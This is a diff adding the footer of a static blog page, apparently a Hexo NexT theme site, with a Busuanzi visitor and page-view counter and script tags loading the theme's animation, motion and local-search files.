+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/embpgp.github.io/lib/anime.min.js"></script>
+  <script src="/embpgp.github.io/lib/velocity/velocity.min.js"></script>
+  <script src="/embpgp.github.io/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/embpgp.github.io/js/utils.js"></script>
+
+<script src="/embpgp.github.io/js/motion.js"></script>
+
+
+<script src="/embpgp.github.io/js/schemes/pisces.js"></script>
+
+
+<script src="/embpgp.github.io/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/embpgp.github.io/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
